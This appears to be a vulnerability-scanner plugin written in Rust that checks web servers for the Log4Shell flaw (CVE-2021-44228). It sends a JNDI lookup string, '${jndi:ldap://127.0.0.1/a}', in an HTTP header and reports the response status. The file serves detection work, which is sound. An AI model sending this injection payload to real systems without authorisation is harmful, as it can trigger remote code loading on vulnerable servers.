/* http-vuln-cve2021-44228-3 - Log4Shell JNDI probe. */
#![allow(dead_code)]
mod arsenal;
use arsenal::*;

#[no_mangle]
pub extern "C" fn almap_script_run(ctx: *mut AlScriptContext) -> i32 {
let mut code: i32 = 0;
let port = unsafe { (*ctx).port };
let mut resp = String::new();
resp = match http_request(ctx, "GET", "/", None, "X-Api-Version: ${jndi:ldap://127.0.0.1/a}\r\n", "", None, 8192) {
    Some(r) if !r.is_empty() => r,
    _ => { set_out(ctx, "http-vuln-cve2021-44228-3: no HTTP response"); return 0; }
};
code = http_status(&resp);
if (true && code > 0) {
    set_out(ctx, &format!("CVE-2021-44228 probe sent (HTTP {}); JNDI callback required to confirm", code));
} else {
    set_out(ctx, "CVE-2021-44228: no response");
}
0
}
